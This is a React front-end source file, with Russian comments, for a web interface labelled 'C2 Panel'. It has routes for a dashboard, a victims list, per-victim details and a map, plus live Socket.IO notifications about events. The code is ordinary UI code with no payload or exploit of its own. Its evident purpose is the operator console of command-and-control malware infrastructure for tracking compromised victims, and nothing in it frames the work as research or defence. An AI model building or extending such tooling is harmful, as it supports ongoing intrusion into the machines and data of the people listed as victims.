import React, { useState, useEffect } from 'react';
import { BrowserRouter, Routes, Route, Link } from 'react-router-dom';
import io from 'socket.io-client';
import Dashboard from './components/Dashboard';
import VictimsList from './components/VictimsList';
import VictimDetail from './components/VictimDetail';
import MapView from './components/MapView';

function App() {
  const [darkMode, setDarkMode] = useState(false);
  const [notifications, setNotifications] = useState([]);
  const [socket, setSocket] = useState(null);

  useEffect(() => {
    // Подключаемся к Socket.IO
    const socketIo = io();
    setSocket(socketIo);

    socketIo.on('connect', () => {
      console.log('Connected to server');
    });

    socketIo.on('notification', (data) => {
      setNotifications(prev => [data, ...prev].slice(0, 50));

      // Показываем уведомление в браузере
      if (Notification.permission === 'granted') {
        new Notification('New Event', {
          body: `${data.type}: ${data.message}`,
          icon: '/favicon.ico'
        });
      }
    });

    // Запрашиваем разрешение на уведомления
    if (Notification.permission !== 'denied') {
      Notification.requestPermission();
    }

    return () => {
      socketIo.disconnect();
    };
  }, []);

  const clearNotifications = () => {
    setNotifications([]);
  };

  return (
    <BrowserRouter>
      <div className={`app ${darkMode ? 'dark' : 'light'}`}>
        <nav className="navbar">
          <div className="nav-brand">
            <span>🚀</span> C2 Panel
          </div>
          <div className="nav-links">
            <Link to="/">Dashboard</Link>
            <Link to="/victims">Victims</Link>
            <Link to="/map">Map</Link>
          </div>
          <button className="theme-toggle" onClick={() => setDarkMode(!darkMode)}>
            {darkMode ? '☀️' : '🌙'}
          </button>
        </nav>

        <div className="container">
          <Routes>
            <Route path="/" element={<Dashboard />} />
            <Route path="/victims" element={<VictimsList />} />
            <Route path="/victim/:id" element={<VictimDetail />} />
            <Route path="/map" element={<MapView />} />
          </Routes>
        </div>

        <div className="notifications-panel">
          <h3>
            🔔 Live Updates
            <button onClick={clearNotifications} className="btn-clear">Clear</button>
          </h3>
          <div className="notifications-list">
            {notifications.length === 0 && (
              <div className="no-notifications">No new notifications</div>
            )}
            {notifications.map((notif, i) => (
              <div key={i} className={`notification ${notif.type}`}>
                <span className="time">{new Date(notif.timestamp).toLocaleTimeString()}</span>
                <span className="message">{notif.message}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </BrowserRouter>
  );
}

export default App;